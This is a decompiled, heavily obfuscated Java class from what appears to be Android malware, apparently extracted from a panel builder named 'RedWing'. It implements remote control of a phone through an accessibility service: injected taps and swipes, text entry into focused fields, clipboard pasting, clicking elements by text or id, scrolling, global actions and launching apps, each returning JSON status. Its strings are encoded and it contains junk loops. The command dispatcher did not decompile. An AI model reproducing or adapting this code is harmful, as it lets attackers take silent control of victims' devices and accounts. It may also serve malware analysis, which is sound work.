package v.s;

import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.graphics.Path;
import android.os.Bundle;
import android.os.Process;
import android.view.accessibility.AccessibilityNodeInfo;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class EGkFhLGNSY179 {
    public static final EGkFhLGNSY179 dDIMxZXP1V8HdM = new EGkFhLGNSY179();

    static {
        TypefaceCache.obtain("00010079004F00B400F300AD00DB00B70037");
    }

    public static DataQFAdapter D5P1xCAyuvgF() {
        DataQFAdapter.Companion.getClass();
        return DataQFAdapter.instance;
    }

    public static AccessibilityNodeInfo Ee8d2j4S9Vm5yGuR(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoEe8d2j4S9Vm5yGuR;
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string = className.toString()) != null && KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000600720052009300C400BA00CA00B3"), false) && accessibilityNodeInfo.isFocused()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoEe8d2j4S9Vm5yGuR = Ee8d2j4S9Vm5yGuR(child)) != null) {
                return accessibilityNodeInfoEe8d2j4S9Vm5yGuR;
            }
        }
        return null;
    }

    public static JSONObject J0zjQ7CAgohuxU20eCW6(int i, int i2, int i3, int i4, long j) {
        DataQFAdapter dataQFAdapterD5P1xCAyuvgF = D5P1xCAyuvgF();
        if (dataQFAdapterD5P1xCAyuvgF == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009400F500AD00C400AE00200073"));
        }
        Path path = new Path();
        path.moveTo(i, i2);
        path.lineTo(i3, i4);
        dataQFAdapterD5P1xCAyuvgF.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, j)).build(), null, null);
        return new JSONObject().put(TypefaceCache.obtain("003000610052009700F500BB"), true);
    }

    public static JSONObject MLSIo1htfMPWeB8V876L(String str) {
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        AccessibilityNodeInfo accessibilityNodeInfoXDyLpEZyrcKVe0 = xDyLpEZyrcKVe0(accessibilityNodeInfoPyu8ovAipBTLYAiKab);
        if (accessibilityNodeInfoXDyLpEZyrcKVe0 == null) {
            accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B008100FF00BC00C700B400260072001B008E00FE00AF00C700B3"));
        }
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        accessibilityNodeInfoXDyLpEZyrcKVe0.performAction(2097152, bundle);
        accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
        return new JSONObject().put(TypefaceCache.obtain("0037006F004B008200F4"), str);
    }

    public static boolean Qrz92kRPw4GcghAc(AccessibilityNodeInfo accessibilityNodeInfo) {
        for (int i = 0; !accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.getParent() != null && i < 5; i++) {
            accessibilityNodeInfo = accessibilityNodeInfo.getParent();
        }
        return accessibilityNodeInfo.performAction((-66) + 82);
    }

    public static JSONObject b1EoSIRjJHO5(String str) {
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoPyu8ovAipBTLYAiKab.findAccessibilityNodeInfosByText(str);
        boolean z = true ^ (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty());
        int size = listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0;
        accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
        return new JSONObject().put(TypefaceCache.obtain("00250079004E008900F4"), z).put(TypefaceCache.obtain("00200079004E008900E4"), size).put(TypefaceCache.obtain("0037007300430093"), str);
    }

    public static JSONObject dDIMxZXP1V8HdM(String str) {
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfoPyu8ovAipBTLYAiKab.findAccessibilityNodeInfosByViewId(str);
        if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
            boolean zQrz92kRPw4GcghAc = Qrz92kRPw4GcghAc((AccessibilityNodeInfo) imhBI9RqzETHtVIJe.XuO9PPFo607ssKwZjNW(listFindAccessibilityNodeInfosByViewId));
            accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
            return new JSONObject().put(TypefaceCache.obtain("0020007A0052008400FB00BA00D6"), zQrz92kRPw4GcghAc).put("id", str);
        }
        return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002A0072001B008900FF00AB009200A1002C00630055008300AA00FF") + str);
    }

    public static JSONObject gIIiyi2ddlMDR0(String str) {
        DataQFAdapter dataQFAdapterD5P1xCAyuvgF = D5P1xCAyuvgF();
        if (dataQFAdapterD5P1xCAyuvgF == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009400F500AD00C400AE00200073"));
        }
        Intent launchIntentForPackage = dataQFAdapterD5P1xCAyuvgF.getPackageManager().getLaunchIntentForPackage(str);
        if (launchIntentForPackage != null) {
            launchIntentForPackage.addFlags(268435456);
            dataQFAdapterD5P1xCAyuvgF.startActivity(launchIntentForPackage);
            return new JSONObject().put(TypefaceCache.obtain("002C0066005E008900F500BB"), str);
        }
        return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("00220066004B00C700FE00B000C600E700250079004E008900F400E50092") + str);
    }

    public static JSONObject gmNWMfvn6zlEj(String str) {
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoPyu8ovAipBTLYAiKab.findAccessibilityNodeInfosByText(str);
        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) imhBI9RqzETHtVIJe.XuO9PPFo607ssKwZjNW(listFindAccessibilityNodeInfosByText);
            while (System.nanoTime() < 0) {
                Long.hashCode(System.nanoTime());
            }
            boolean zPerformAction = accessibilityNodeInfo.performAction(32);
            accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
            return new JSONObject().put(TypefaceCache.obtain("002F00790055008000CF00BC00DE00AE0020007D005E0083"), zPerformAction);
        }
        return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("003700730043009300B000B100DD00B3006300700054009200FE00BB008800E7") + str);
    }

    public static JSONObject hjneShqpF9Tis4(int i) {
        DataQFAdapter dataQFAdapterD5P1xCAyuvgF = D5P1xCAyuvgF();
        return new JSONObject().put(TypefaceCache.obtain("003300730049008100FF00AD00DF00A20027"), dataQFAdapterD5P1xCAyuvgF != null ? dataQFAdapterD5P1xCAyuvgF.performGlobalAction(i) : false);
    }

    public static AccessibilityNodeInfo ibVTtJUNfrGYbW(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoIbVTtJUNfrGYbW;
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoIbVTtJUNfrGYbW = ibVTtJUNfrGYbW(child)) != null) {
                return accessibilityNodeInfoIbVTtJUNfrGYbW;
            }
        }
        return null;
    }

    public static JSONObject nQilHWaqS401ZtR(boolean z) {
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        int i = z ? 4143 - 47 : 8192;
        AccessibilityNodeInfo accessibilityNodeInfoIbVTtJUNfrGYbW = ibVTtJUNfrGYbW(accessibilityNodeInfoPyu8ovAipBTLYAiKab);
        if (accessibilityNodeInfoIbVTtJUNfrGYbW == null) {
            accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009400F300AD00DD00AB002F00770059008B00F500FF00C400AE00260061"));
        }
        accessibilityNodeInfoIbVTtJUNfrGYbW.performAction(i);
        accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
        return new JSONObject().put(TypefaceCache.obtain("003000750049008800FC00B300D700A3"), z ? TypefaceCache.obtain("00270079004C0089") : "up");
    }

    public static AccessibilityNodeInfo pyu8ovAipBTLYAiKab() {
        DataQFAdapter dataQFAdapterD5P1xCAyuvgF = D5P1xCAyuvgF();
        if (dataQFAdapterD5P1xCAyuvgF != null) {
            return dataQFAdapterD5P1xCAyuvgF.getRootInActiveWindow();
        }
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r2v3, types: [boolean, int] */
    public static JSONObject vekpFI4d1Nc4fakF(int i, int i2) {
        DataQFAdapter dataQFAdapterD5P1xCAyuvgF = D5P1xCAyuvgF();
        if (dataQFAdapterD5P1xCAyuvgF == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009400F500AD00C400AE00200073"));
        }
        Path path = new Path();
        path.moveTo(i, i2);
        dataQFAdapterD5P1xCAyuvgF.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), null, null);
        return new JSONObject().put(TypefaceCache.obtain("0020007A0052008400FB00BA00D6"), (boolean) (34 - 33)).put("x", i).put("y", i2);
    }

    public static JSONObject w9sT1Swbhx3hs(String str, boolean z) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        if (z) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfoPyu8ovAipBTLYAiKab.findAccessibilityNodeInfosByText(str);
            listFindAccessibilityNodeInfosByText = null;
            if (listFindAccessibilityNodeInfosByText2 != null) {
                ArrayList arrayList = new ArrayList();
                for (Object obj : listFindAccessibilityNodeInfosByText2) {
                    CharSequence text = ((AccessibilityNodeInfo) obj).getText();
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(text != null ? text.toString() : null, str)) {
                        arrayList.add(obj);
                    }
                }
                listFindAccessibilityNodeInfosByText = arrayList;
            }
        } else {
            listFindAccessibilityNodeInfosByText = accessibilityNodeInfoPyu8ovAipBTLYAiKab.findAccessibilityNodeInfosByText(str);
        }
        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
            boolean zQrz92kRPw4GcghAc = Qrz92kRPw4GcghAc((AccessibilityNodeInfo) imhBI9RqzETHtVIJe.XuO9PPFo607ssKwZjNW(listFindAccessibilityNodeInfosByText));
            accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
            return new JSONObject().put(TypefaceCache.obtain("0020007A0052008400FB00BA00D6"), zQrz92kRPw4GcghAc).put(TypefaceCache.obtain("0037007300430093"), str);
        }
        return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("003700730043009300B000B100DD00B3006300700054009200FE00BB008800E7") + str);
    }

    public static JSONObject wotphlvK9sPbXJ(String str) {
        DataQFAdapter dataQFAdapterD5P1xCAyuvgF = D5P1xCAyuvgF();
        if (dataQFAdapterD5P1xCAyuvgF == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009400F500AD00C400AE00200073"));
        }
        ((ClipboardManager) dataQFAdapterD5P1xCAyuvgF.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("rw", str));
        AccessibilityNodeInfo accessibilityNodeInfoPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
        if (accessibilityNodeInfoPyu8ovAipBTLYAiKab == null) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
        }
        AccessibilityNodeInfo accessibilityNodeInfoXDyLpEZyrcKVe0 = xDyLpEZyrcKVe0(accessibilityNodeInfoPyu8ovAipBTLYAiKab);
        while (Process.myPid() < -999) {
            String.valueOf(System.nanoTime());
        }
        if (accessibilityNodeInfoXDyLpEZyrcKVe0 == null) {
            accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B008100FF00BC00C700B400260072001B008E00FE00AF00C700B3"));
        }
        accessibilityNodeInfoXDyLpEZyrcKVe0.performAction(32768);
        accessibilityNodeInfoPyu8ovAipBTLYAiKab.recycle();
        return new JSONObject().put(TypefaceCache.obtain("003300770048009300F500BB"), str);
    }

    public static AccessibilityNodeInfo xDyLpEZyrcKVe0(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoFindFocus = accessibilityNodeInfo.findFocus(1);
        while (Runtime.getRuntime().maxMemory() < 0) {
            StringBuilder sb = new StringBuilder();
            sb.append(0);
            sb.setLength(0);
        }
        return accessibilityNodeInfoFindFocus != null ? accessibilityNodeInfoFindFocus : Ee8d2j4S9Vm5yGuR(accessibilityNodeInfo);
    }

    /* JADX WARN: Code duplicated, block: B:102:0x02bf  */
    /* JADX WARN: Code duplicated, block: B:145:0x03ef  */
    /* JADX WARN: Code duplicated, block: B:146:0x03f3  */
    /* JADX WARN: Code duplicated, block: B:149:0x0424  */
    /* JADX WARN: Code duplicated, block: B:152:0x0434  */
    /* JADX WARN: Code duplicated, block: B:153:0x043b  */
    /* JADX WARN: Code duplicated, block: B:156:0x044f  */
    /* JADX WARN: Code duplicated, block: B:159:0x046b  */
    /* JADX WARN: Code duplicated, block: B:162:0x047c  */
    /* JADX WARN: Code duplicated, block: B:195:0x01b0 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:23:0x00b4  */
    /* JADX WARN: Code duplicated, block: B:35:0x010c A[Catch: Exception -> 0x03bd, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x03bd, blocks: (B:24:0x00c4, B:35:0x010c, B:39:0x0128, B:43:0x014c, B:47:0x0169, B:51:0x0187, B:55:0x01a4), top: B:177:0x00c4 }] */
    /* JADX WARN: Code duplicated, block: B:39:0x0128 A[Catch: Exception -> 0x03bd, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x03bd, blocks: (B:24:0x00c4, B:35:0x010c, B:39:0x0128, B:43:0x014c, B:47:0x0169, B:51:0x0187, B:55:0x01a4), top: B:177:0x00c4 }] */
    /* JADX WARN: Code duplicated, block: B:43:0x014c A[Catch: Exception -> 0x03bd, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x03bd, blocks: (B:24:0x00c4, B:35:0x010c, B:39:0x0128, B:43:0x014c, B:47:0x0169, B:51:0x0187, B:55:0x01a4), top: B:177:0x00c4 }] */
    /* JADX WARN: Code duplicated, block: B:47:0x0169 A[Catch: Exception -> 0x03bd, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x03bd, blocks: (B:24:0x00c4, B:35:0x010c, B:39:0x0128, B:43:0x014c, B:47:0x0169, B:51:0x0187, B:55:0x01a4), top: B:177:0x00c4 }] */
    /* JADX WARN: Code duplicated, block: B:51:0x0187 A[Catch: Exception -> 0x03bd, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x03bd, blocks: (B:24:0x00c4, B:35:0x010c, B:39:0x0128, B:43:0x014c, B:47:0x0169, B:51:0x0187, B:55:0x01a4), top: B:177:0x00c4 }] */
    /* JADX WARN: Code duplicated, block: B:55:0x01a4 A[Catch: Exception -> 0x03bd, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x03bd, blocks: (B:24:0x00c4, B:35:0x010c, B:39:0x0128, B:43:0x014c, B:47:0x0169, B:51:0x0187, B:55:0x01a4), top: B:177:0x00c4 }] */
    /* JADX WARN: Code duplicated, block: B:66:0x01f6  */
    /* JADX WARN: Code duplicated, block: B:71:0x020d A[Catch: Exception -> 0x03b5, TRY_ENTER, TRY_LEAVE, TryCatch #11 {Exception -> 0x03b5, blocks: (B:67:0x01f9, B:71:0x020d, B:75:0x0225, B:79:0x023a, B:83:0x0250, B:87:0x0268, B:91:0x0287), top: B:193:0x01f9 }] */
    /* JADX WARN: Code duplicated, block: B:75:0x0225 A[Catch: Exception -> 0x03b5, TRY_ENTER, TRY_LEAVE, TryCatch #11 {Exception -> 0x03b5, blocks: (B:67:0x01f9, B:71:0x020d, B:75:0x0225, B:79:0x023a, B:83:0x0250, B:87:0x0268, B:91:0x0287), top: B:193:0x01f9 }] */
    /* JADX WARN: Code duplicated, block: B:79:0x023a A[Catch: Exception -> 0x03b5, TRY_ENTER, TRY_LEAVE, TryCatch #11 {Exception -> 0x03b5, blocks: (B:67:0x01f9, B:71:0x020d, B:75:0x0225, B:79:0x023a, B:83:0x0250, B:87:0x0268, B:91:0x0287), top: B:193:0x01f9 }] */
    /* JADX WARN: Code duplicated, block: B:7:0x0019  */
    /* JADX WARN: Code duplicated, block: B:83:0x0250 A[Catch: Exception -> 0x03b5, TRY_ENTER, TRY_LEAVE, TryCatch #11 {Exception -> 0x03b5, blocks: (B:67:0x01f9, B:71:0x020d, B:75:0x0225, B:79:0x023a, B:83:0x0250, B:87:0x0268, B:91:0x0287), top: B:193:0x01f9 }] */
    /* JADX WARN: Code duplicated, block: B:87:0x0268 A[Catch: Exception -> 0x03b5, TRY_ENTER, TRY_LEAVE, TryCatch #11 {Exception -> 0x03b5, blocks: (B:67:0x01f9, B:71:0x020d, B:75:0x0225, B:79:0x023a, B:83:0x0250, B:87:0x0268, B:91:0x0287), top: B:193:0x01f9 }] */
    /* JADX WARN: Code duplicated, block: B:91:0x0287 A[Catch: Exception -> 0x03b5, TRY_ENTER, TRY_LEAVE, TryCatch #11 {Exception -> 0x03b5, blocks: (B:67:0x01f9, B:71:0x020d, B:75:0x0225, B:79:0x023a, B:83:0x0250, B:87:0x0268, B:91:0x0287), top: B:193:0x01f9 }] */
    /* JADX WARN: Code duplicated, block: B:93:0x0293  */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:159:0x046b -> B:160:0x046d). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:162:0x047c -> B:161:0x046f). Please report as a decompilation issue!!! */
    /*  JADX ERROR: JadxOverflowException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxOverflowException: Regions stack size limit reached
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        */
    public final java.lang.Object JXn4Qf7zpnLjP5(org.json.JSONArray r30, v.s.CWIOrUfHtKyaxQib0W r31) {
        /*
            Method dump skipped, instruction units count: 1206
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: v.s.EGkFhLGNSY179.JXn4Qf7zpnLjP5(org.json.JSONArray, v.s.CWIOrUfHtKyaxQib0W):java.lang.Object");
    }
}
